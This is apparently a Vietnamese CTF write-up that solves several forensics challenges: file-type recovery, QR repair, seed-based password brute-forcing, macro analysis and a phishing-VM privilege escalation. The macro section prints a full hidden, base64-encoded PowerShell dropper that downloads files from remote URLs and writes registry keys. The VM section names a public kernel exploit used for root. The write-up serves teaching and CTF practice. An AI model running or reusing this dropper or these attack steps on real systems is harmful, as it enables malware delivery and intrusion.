# For06 - Beginner forensics
## Description : 
When I open this file in notepad, it looks very chaotic. Do you know what file it is?

Bài này khá đơn giản, đề cho 1 file txt nhưng thực chất là file ảnh png. Đổi đuôi file và xem ảnh

![image](https://user-images.githubusercontent.com/92283038/175817849-e81a1f9c-d168-4403-b86d-12ba4a8ddbeb.png)


# For05 - Corrupt
## Description : It seems that this file is corrupt. Pls fix it for me!

Đề bài cho chúng ta 1 file ảnh bị hỏng, chúng ta cần sửa lại để xem. Ở đây mình sử dụng tool [PCRT](https://github.com/sherlly/PCRT) để sửa.

Đây là kết quả: 

![image](https://user-images.githubusercontent.com/92283038/175798735-c998e745-d77f-4d1e-9275-5eda68040af4.png)

Mã QR này đang bị thiếu mất một vài chỗ, nên mình sử dụng photoshop để phục hồi một phần ở góc phần tư 
![image](https://user-images.githubusercontent.com/92283038/175798764-91b2d6cd-3b10-43b3-86fc-769bfab2e02c.png)

Tới đây mã vẫn chưa thể quét được, mình phát hiện ra 1 tool là [QRazyBox](https://merricx.github.io/qrazybox/) để đọc thông tin trong mã QR 

![image](https://user-images.githubusercontent.com/92283038/175798807-e75571f1-8549-4db2-b343-7db4ff84dad5.png)


# For04 - CSIRT
## Description : Client's company has a mole, he opned the port for this accomplices to steal data. A document sent is encrypted and we don't have the password. At the momment, we have caught the insider but no password. He only admitted haved compressed the file and created password arount 21:25-21:35 on April 24th, 2022 ICT Time. Can you help me? We have iocs.

Đề cho chúng ta 1 file pcap, mình xem thử HTTP Object và thấy một số file thú vị nên export ra 

![image](https://user-images.githubusercontent.com/92283038/175798853-86b6e16f-07f9-4d9f-a70d-7661c13e0bd1.png)

Tuy nhiên file password.txt là flag.txt không có gì ở trong cả :v Làm gì dễ ăn thế :> 

Còn file gen_password.py có nội dung như sau
```python:
    def gen_Pass(key):
      password = ''
      password = hashlib.md5(str(key).encode())
      password = password.hexdigest()
      password += '-'
      password += 'bjAwYg=='
      return password

    if __name__ == '__main__':
      sed_ = int(datetime.datetime.utcnow().timestamp())
      random.seed(sed_)
      key = random.randint(1,1000000000)
      password = gen_Pass(key)
      print('Password:', password)
```
Ở đây thì password được tạo ra bằng cách random với seed là thời gian hiện tại lúc chạy script. Trong đề bài có đề cập thời gian tạo password là ngày 24/4/2022 lúc khoảng 21:25 -> 21:35 giờ ICT. Từ đây mình suy ra có thể tạo lại seed là bruteforce password, một chi tiết khác là ở đây là múi giờ ICT nhưng python lại sử dụng khung giờ UCT để tạo seed nên thời gian phải là 14:25 -> 14:35 UCT. 

### Code tạo seed: 
```python:
    from datetime import datetime, timezone
for i in range(25,36):
    for j in range(0,60):
        dt = datetime( 2022, 4, 24, 14, i, j, tzinfo=timezone.utc )
        timestamp = int( dt.timestamp() )
        f.write(str(timestamp))
        f.write("\n")
f.close()

```
### Code generate password 
```python:
import random
import hashlib
import datetime


def gen_Pass(key):
	password = ''
	password = hashlib.md5(str(key).encode())
	password = password.hexdigest()
	password += '-'
	password += 'bjAwYg=='
	return password

if __name__ == '__main__':
	with open('result.txt','r') as f:
		seed_ = f.readlines()
	password_file = open('password.txt','w')
	for i in seed_:
		random.seed(i)
		key = random.randint(1,1000000000)
		password = gen_Pass(key)
		password_file.write(password)
		password_file.write('\n')
	password_file.close()
  ```
  Giờ mình sẽ sử dụng password list vừa rồi để làm wordlist cracck file zip. 
  
  ![image](https://user-images.githubusercontent.com/92283038/175799909-4a7c8b6f-dc34-4640-9ab0-94654c8c155b.png)

Cuối cùng là dúng password vừa tìm được là đọc flag thôi ^^ 

![image](https://user-images.githubusercontent.com/92283038/175801051-cd9a02f6-97d4-4a90-b6d4-f2ea5b9d2228.png)


# For04 - S1mple Obfusc4tion
## Description : The flag has 2 parts. Part 2 has been encode and saved somewhere. Can you find it?

Đề bài cho chúng ta 1 file doc. Khi mở file lên thì có hiện ra 1 thông báo là file có marco, nên mình đã sử dụng [olevba](https://github.com/decalage2/oletools/wiki/olevba) để xem

Phát hiện có 1 đoạn Shell Script khả nghi
```
"Powershell.exe -WindowStyle Hidden -nop -ENCOD JABFAGcAUgBJADkAYgBqAGgANQBTACAAIAA9ACAAKAAnAE4AZQB3AC0AVABlAG0AJwArACcAcAAnACsAJwBvAHIAYQByACcAKwAnAHkARgBpAGwAZQAnACkAfAAmACAAKAAgACQAcABzAGgATwBtAGUAWwA0AF0AKwAkAHAAcwBIAE8AbQBFAFsAMwA0AF0AKwAnAFgAJwApADsAJABHAEwASABOAGUAMABVAFIAbwBoACAAPQAgACgAMQAwADAALAA3ADEALAAxADAANAAsADEAMAA4ACwANwAzACwANwAyACwAOAAyACwAMQAwADQALAA5ADcAKQA7ACQARwBGADgAVQBZAHAAYQB3AEIAWAA9ACgAKAAoACIAewA0AH0AewAzAH0AewAyAH0AewA2AH0AewA1AH0AewAxAH0AewAwAH0AIgAgAC0AZgAnAGwAbABOAGEAbQBlACcALAAnAGgANQBTAC4ARgB1ACcALAAnAFIAJwAsACcAZwAnACwAJwB0AFAANwBFACcALAAnAGoAJwAsACcASQA5AGIAJwApACkAIAAgAC0AcgBlAFAATABBAEMAZQAgACcAdABQADcAJwAsAFsAQwBIAGEAUgBdADMANgApAHwAJgAgACgAKABnAGUAdAAtAFYAQQByAEkAQQBCAEwAZQAgACcAKgBtAEQAcgAqACcAKQAuAE4AYQBNAEUAWwAzACwAMQAxACwAMgBdAC0AagBPAEkATgAnACcAKQA7ACQARwBMAEgATgBlADAAVQBSAG8AaAAgACsAPQAgACgAOAA3ACwAMQAxADkALAAxADAAMwAsADkAOAAsADUAMAAsADgAOQAsADEAMAAzACwAMQAwADAALAA3ADEALAAxADAANAAsADEAMAA4ACwANwAzACwANwAxACwAOQAwACwAMQAxADUALAA4ADkAL" _
& "AA4ADcAKQA7ACQARwBMAEgATgBlADAAVQBSAG8AaAAgACsAPQAoADkAOQAsADEAMAAzACwANwA5ACwAMQAwADUALAA3ADQALAAxADAAMgAsADkANwAsADcAMgAsADgANgAsADEAMgAyACwAMQAwADAALAA3ADEALAAxADEAOQAsADEAMgAyACwAOAA4ACwANQAxACwANwAzACwAMQAyADIALAA4ADkALAA4ADcALAAxADIAMAAsADEAMAAyACwAOQA3ACwANwAxACwANwAwACkAOwAkAEUAZwA0AHcAOAA1AE0AOQBRAGkAIAA9ACAAKAAoACcAdAByAFMAJwArACcAVwB4AHIAawBlAGQAIAAnACsAJwBzAHgAIABoAGMAYQAnACsAJwBkACcAKwAnAHIAZAAnACsAJwAsACAAZgB4ACcAKwAnAHIAJwArACcAZwB4AHQAJwArACcAIABoAHgAJwArACcAdwAgAHQAeAAgAHYAJwArACcAYwBhAGQAYwBjAGEAJwArACcAZAB0AGkAeAAnACsAJwBuACEAJwArACcAIQAnACsAJwAhACEAdAByACcAKwAnAFMALgBSAGUAJwArACcAUAAnACsAJwBsAEEAYwAnACsAJwBFACgAdAByAFMAeAB0AHIAJwArACcAUwAsACcAKwAnAHQAcgBTADAAdAByAFMAKQAuACcAKwAnAFIAJwArACcAZQAnACsAJwBQAGwAQQBjAEUAKAB0ACcAKwAnAHIAJwArACcAUwAnACsAJwBjAGEAJwArACcAZAB0ACcAKwAnAHIAUwAsAHQAcgAnACsAJwBTAGEAdAAnACsAJwByAFMAJwArACcAKQAnACkAIAAgAC0AcgBlAHAATABhAEMARQAgACcAdAByAFMAJwAsAFsAQwBIAEEAcgBdADMAOQApACAAfAAgAC4AIA" _
& "AoACgAdgBhAHIASQBhAEIAbABlACAAJwAqAG0AZAByACoAJwApAC4AbgBhAG0ARQBbADMALAAxADEALAAyAF0ALQBqAE8AaQBuACcAJwApADsAJABHAEwASABOAGUAMABVAFIAbwBoACAAKwA9ACgAMQAyADEALAA5ADAALAA3ADIALAA0ADgALAAxADAANQApADsADQAKACQAcwBFAHAAYgA1AHAAdQBUAHQAVgAgAD0AKAAoACcAewA0AH0AewAwAH0AewAzAH0AewA1AH0AewAxAH0AewA3AH0AewAyAH0AewA2AH0AJwAtAGYAJwBuAFYAZQByAFQAXQA6ACcALAAnAEgATgBlACcALAAnAGgAJwAsACcAOgB0AG8AQgBhAFMARQA2ACcALAAnAFsAUwB5AHMAdABlAG0ALgBDAG8AJwAsACcANABTAFQAUgBJAE4AZwAoAGoARAA4AEcATAAnACwAJwApACcALAAnADAAVQBSAG8AJwApACkALgByAGUAUABMAEEAQwBlACgAKABbAGMAaABBAFIAXQAxADAANgArAFsAYwBoAEEAUgBdADYAOAArAFsAYwBoAEEAUgBdADUANgApACwAWwBzAHQAcgBJAG4AZwBdAFsAYwBoAEEAUgBdADMANgApACAAfAAmACAAKAAoAFYAQQByAEkAYQBCAEwAZQAgACcAKgBNAEQAUgAqACcAKQAuAG4AQQBNAEUAWwAzACwAMQAxACwAMgBdAC0AagBPAGkAbgAnACcAKQA7AGUAYwBoAG8AIAAkAHMARQBwAGIANQBwAHUAVAB0AFYAIAB8ACAALgAoACcAewAyAH0AewAxAH0AewAwAH0AJwAgAC0AZgAgACcAaQBsAGUAJwAsACcAdQB0AC0AZgAnACwAJwBvACcAKQAgACQAewBHAEYAOABVAFkAcAB" _
& "hAHcAQgBYAH0AOwAkAGEAegBmAGMAZgBUAG8AaQBCAHEAPQAoACIAewAxAH0AewA0AH0AewA4AH0AewA3AH0AewAyAH0AewA1AH0AewA2AH0AewA5AH0AewAzAH0AewAwAH0AIgAgAC0AZgAgACcAaQBvAG4AJwAsACcAVwBlAGwAYwAnACwAJwBfAFcAYQByAGcAYQAnACwAJwBjAGEAdAAnACwAJwBvAG0AJwAsACcAbQBlACEAJwAsACcAUwAxAG0AcABsAGUAJwAsACcAbwAnACwAJwBlAF8AdAAnACwAJwBfAE8AYgBmAHUAJwApADsAJABjAE8AUAAyAGwAZwBxAFIAaABiAD0AJwBYAGcAZgB7AGoAZwBuAHsAdABnAHoAfAB7AGMAPABQAGcAOwB9AGsAJwA7ACQAYwBPAFAAMgBsAGcAcQBSAGgAYgAuACgAIgB7ADEAfQB7ADIAfQB7ADAAfQAiACAALQBmACcAYQB5ACcALAAnAHQAbwBjAGgAYQAnACwAJwByAGEAcgByACcAKQAuAGkAbgB2AG8AawBlACgAKQAgAHwAIAAuACgAIgB7ADIAfQB7ADEAfQB7ADAAfQB7ADMAfQAiACAALQBmACcALQAnACwAJwBhAGMAaAAnACwAJwBmAG8AcgBlACcALAAnAG8AYgBqAGUAYwB0ACcAKQAgACAALQBQAHIAbwBjAGUAcwBzAHsAJAByAEUAaQBhAG4ATQBFAEsAZwB5ACAAKwA9AFsAYwBoAGEAcgBdACgAWwBiAHkAdABlAF0AWwBjAGgAYQByAF0AJABfACAALQBiAHgAbwByACAAMAB4AGYAKQB9ADsAJABDADQATABnADgAeABjAGMAVwBIAD0AJwBoAHQAdABwAHMAOgBdAFsAKABzACkAXQB3AF0AWwAoAHMAKQBdAHcAdwBo" _
& "AGkAdABlAGgAYQB0AC4AYwBvAG0AXQBbACgAcwApAF0AdwB3ADEAegB3AF0AWwAoAHMAKQBdAHcAJABoAHQAdABwAHMAOgBdAFsAKABzACkAXQB3AF0AWwAoAHMAKQBdAHcAdwBhAHIAZwBhAG0AZQAuAGMAbwBtAF0AWwAoAHMAKQBdAHcAdABoAHUAYwBoAGEAbgBoACcALgByAGUAcABMAEEAYwBFACgAKAAnAF0AJwArACcAWwAnACsAKAAnACgAcwApAF0AJwArACcAdwAnACkAKQAsACgAWwBhAHIAcgBhAHkAXQAoACcALwAnACkALAAoACcAeAB3ACcAKwAnAGUAJwApACkAWwAwAF0AKQAuAHMAUABsAEkAVAAoACcAJAAnACkAOwAkAG0AQQBNAHEANQBpAHgAWABMAGkAIAA9ADAAOwB0AHIAeQAgAHsAZgBvAHIAZQBhAGMAaAAoACQASgBKAFUAMQBFADgASQBrAHQATAAgACAAaQBuACAAJABDADQATABnADgAeABjAGMAVwBIACkAewAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJABKAEoAVQAxAEUAOABJAGsAdABMACAALAAnAEMAOgBcAFUAcwBlAHIAcwBcAFcAaABpAHQAZQBoAGEAdAAnACkAfQB9AGMAYQB0AGMAaAAgAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEUAeABjAGUAcAB0AGkAbwBuAF0ALABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ASQBPAEUAeABjAGUAcAB0AGkAbwBuAF0AIAB7ACgAIgB7ADkAfQB7ADMAfQB7A" _
& "DcAfQB7ADAAfQB7ADEAMAB9AHsAOAB9AHsAMgB9AHsANQB9AHsAMQAxAH0AewA2AH0AewA0AH0AewAxAH0AIgAgAC0AZgAgACcAbwBuACcALAAnAGkAcwB0ACEAIQAhACcALAAnACAAbwByACAARgBpAGwAJwAsACcAbgBuAGUAJwAsACcAZQB4ACcALAAnAGUAIABkAG8AZQBzACAAJwAsACcAdAAgACcALAAnAGMAdABpACcALAAnAGEAaQBsAGUAZAAhACEAIQAnACwAJwBDAG8AJwAsACcAIABGACcALAAnAG4AbwAnACkAOwAkAG0AQQBNAHEANQBpAHgAWABMAGkAIAA9ADEAfQA7ACgAKAAnAE4AZQB3ACcAKwAnAC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACcAKwAnAHsAMAAnACsAJwB9AEgASwAnACsAJwBDACcAKwAnAFUAOgB7ADAAfQAnACsAJwAgACcAKwAnAC0AJwArACcATgBhAG0AZQAgACcAKwAnAHsAMAB9AHcAaABpAHQAJwArACcAZQBoAGEAJwArACcAdAB7ADAAfQAnACkALQBGACAAIABbAGMAaABhAHIAXQAzADQAKQB8ACAAaQBlAHgAOwBpAGYAKAAkAG0AQQBNAHEANQBpAHgAWABMAGkAIAAgAC0AZwB0ACAAMAApAHsAKAAoACcATgBlAHcAJwArACcALQAnACsAJwBJACcAKwAnAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAnACsAJwAgAC0AUABhAHQAJwArACcAaAAgAEkAOQAnACsAJwBLAEgASwBDAFUAOgAxACcAKwAnAEwAZQB3AGgAaQB0AGUAaABhAHQAJwArACcASQA5ACcAKwAnAEsAIAAtAE4AYQBtACcAKwAnAGUAIABJADkAJwArACcASwB3AG" _
& "EAcgBnAGEAJwArACcAbQBlAEkAOQBLACAALQBWAGEAJwArACcAbAB1AGUAIABOAHoAdgBhAHoAZgAnACsAJwBjACcAKwAnAGYAVABvAGkAQgBxACcAKwAnACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAEkAOQBLAFMAdAByAGkAJwArACcAbgBnAEkAOQBLACcAKQAuAFIAZQBQAGwAQQBDAGUAKAAnAEkAOQBLACcALABbAHMAVAByAEkAbgBnAF0AWwBDAGgAYQByAF0AMwA0ACkALgBSAGUAUABsAEEAQwBlACgAKABbAEMAaABhAHIAXQA0ADkAKwBbAEMAaABhAHIAXQA3ADYAKwBbAEMAaABhAHIAXQAxADAAMQApACwAWwBzAFQAcgBJAG4AZwBdAFsAQwBoAGEAcgBdADkAMgApAC4AUgBlAFAAbABBAEMAZQAoACgAWwBDAGgAYQByAF0ANwA4ACsAWwBDAGgAYQByAF0AMQAyADIAKwBbAEMAaABhAHIAXQAxADEAOAApACwAJwAkACcAKQApAHwAIABpAGUAeAB9AGUAbABzAGUAewBQAFMAIABDADoAXABVAHMAZQByAHMAXABtAHkAXwBhAG4AdABfAHQAaQAzAG0APgAgACgAKAAoACIAewA0AH0AewA5AH0AewAwAH0AewAxADMAfQB7ADcAfQB7ADMAfQB7ADEAfQB7ADEAMAB9AHsAOAB9AHsANgB9AHsAMQA2AH0AewAxADIAfQB7ADEAMQB9AHsAMgB9AHsAMQA1AH0AewA1AH0AewAxADQAfQAiACAALQBmACcAcgBvAHAAZQByAHQAeQAgAC0AUAAnACwAJwBDAFUAOgByAEIAUQB3AGgAJwAsACcAbwAnACwAJwBsAFgAMQBIAEsAJwAsACcATgBlAHcALQBJAHQ" _
& "AJwAsACcAZQAgAGwAWAAxACcALAAnAGwAWAAxAHcAYQByAGcAYQBtAGUAbABYADEAIAAnACwAJwBoACAAJwAsACcAIAAnACwAJwBlAG0AUAAnACwAJwBpAHQAZQBoAGEAdABsAFgAMQAgAC0ATgBhAG0AZQAnACwAJwAtAFAAcgAnACwAJwAgACcALAAnAGEAdAAnACwAJwBTAHQAcgBpAG4AZwBsAFgAMQAnACwAJwBwAGUAcgB0AHkAVAB5AHAAJwAsACcALQBWAGEAbAB1AGUAIAA4AHEAYQByAEUAaQBhAG4ATQBFAEsAZwB5ACAAJwApACkAIAAgAC0AcgBFAHAATABBAEMAZQAgACgAWwBDAGgAQQByAF0AMQAwADgAKwBbAEMAaABBAHIAXQA4ADgAKwBbAEMAaABBAHIAXQA0ADkAKQAsAFsAQwBoAEEAcgBdADMANAAgAC0AcgBFAHAATABBAEMAZQAoAFsAQwBoAEEAcgBdADEAMQA0ACsAWwBDAGgAQQByAF0ANgA2ACsAWwBDAGgAQQByAF0AOAAxACkALABbAEMAaABBAHIAXQA5ADIAIAAgAC0AYwByAGUAcABMAGEAYwBFACgAWwBDAGgAQQByAF0ANQA2ACsAWwBDAGgAQQByAF0AMQAxADMAKwBbAEMAaABBAHIAXQA5ADcAKQAsAFsAQwBoAEEAcgBdADMANgApACAAfAAgAGkAZQB4AH0AOwANAAoA"
```

Sau đó mình sử dụng [CyberChef](https://gchq.github.io/CyberChef) để decode 

![image](https://user-images.githubusercontent.com/92283038/175800047-b7c099c7-9e6f-422b-8fcb-1745acc48726.png)

Ở đây mình thấy biến **$GLHNe0URoh** được chèn các kí tự số 
```
$GLHNe0URoh = (100,71,104,108,73,72,82,104,97)
$GLHNe0URoh += (87,119,103,98,50,89,103,100,71,104,108,73,71,90,115,89,87)
$GLHNe0URoh +=(99,103,79,105,74,102,97,72,86,122,100,71,119,122,88,51,73,122,89,87,120,102,97,71,70)
```

Dùng CyberChef để decode ta được nửa sau của flag 

![image](https://user-images.githubusercontent.com/92283038/175800182-fd90e164-efa6-43c1-af6d-1152aa206080.png)

Tiếp tục chạy các lệnh khác, các lệnh đều in ra các chuỗi kí tự riêng chỉ có 
```
$cOP2lgqRhb='Xgf{jgn{tgz|{c<Pg;}k';  $cOP2lgqRhb.("{1}{2}{0}" -f'ay','tocha','rarr').invoke() | .("{2}{1}{0}{3}" -f'-','ach','fore','object')  -Process{$rEianMEKgy +=[char]([byte][char]$_ -bxor 0xf)}
``` 
là không in ra gì hết. Ta thấy biến $rEianMEKgy được gán nhưng không được xuất ra nên mình echo thử 

![image](https://user-images.githubusercontent.com/92283038/175800370-5fa1700c-0079-4b02-bd94-eba683da2770.png)

Vậy là ta có phần đầu của flag.


# For01 - West Side
## Description : We are investigating a person who often creates phishing websites. This is his virtual machine. Please help us

Bài cho chúng ta file zip nhưng không có pass, author bảo là phải tự crack pass luôn :v Nhưng cũng khá đơn giản vì password ngắn, mình xài JohnTheRipper để crack

![image](https://user-images.githubusercontent.com/92283038/175800454-53a05265-aa90-439b-95ea-b466a9a0ba79.png)

Password là : **superman1**
Giải nén ra thì chúng ta có 1 file VM. Mình sử dụng VMWare để build lên.

![image](https://user-images.githubusercontent.com/92283038/175800491-e31fd20d-7819-4b5a-97f8-5406ad141a5e.png)

Tới đây thì mình bị stuck một lúc, mình thấy nó ghi login bằng username và password là : msfadmin nhưng cứ báo sai :v 

Sau một hồi tìm kiếm thì mình cũng kiếm được một số tài khoản mặc định của Metasploitable

![image](https://user-images.githubusercontent.com/92283038/175800563-0c13cdf3-711e-4cef-9c8e-9bec94a07813.png)


Tada, đã vào được

![image](https://user-images.githubusercontent.com/92283038/175800629-be9e25c2-5557-431e-ab7b-9728f6729956.png)

Mình bắt đầu mò xem ở trong có file flag không, nhưng vì đăng nhập với quyền user nên mình bị hạn chế khá nhiều. Trước tiên là mình tạo một SSH Key Pair đề đăng nhập trên Terminal máy mình :v vì trong VMWare thì mình không kéo lên kéo xuống để xem các file và folder được. 

### Ok, pwn cái VM này thôi nào :> 
Đầu tiên mình check xem coi cái máy này đang chạy phiên bản nào 

![image](https://user-images.githubusercontent.com/92283038/175800865-babde2d2-4d8b-4b83-922a-5bd63ee7c3ab.png)

Sau đó mình google thì kiếm ra một lỗ hổng trên phiên bản này 
[VUL](https://www.exploit-db.com/exploits/40839)

Mình down code expolit và sửa lại thông tin, sau đó dựng server trên local và tải về bằng VM của đề. 
Sau đó chỉ việc compile và chạy code là mình đã thành công leo lên quyền root :> 

![image](https://user-images.githubusercontent.com/92283038/175800928-900d2575-8c4f-4abf-b9b8-73b6624df790.png)

Sau một hồi mò hết các ngóc ngách trong cái máy này thì mình tìm được file **trash.html** trong thư mục /var/www.

Trong này chứa link Pastebin 

![image](https://user-images.githubusercontent.com/92283038/175801167-80334a12-8c61-4837-a901-1686a377a20d.png)


![image](https://user-images.githubusercontent.com/92283038/175801000-ff542d6e-97eb-4677-a931-8ee9f1ab80da.png)

Tada, đảo ngược chữ lại và chúng ta có flag.

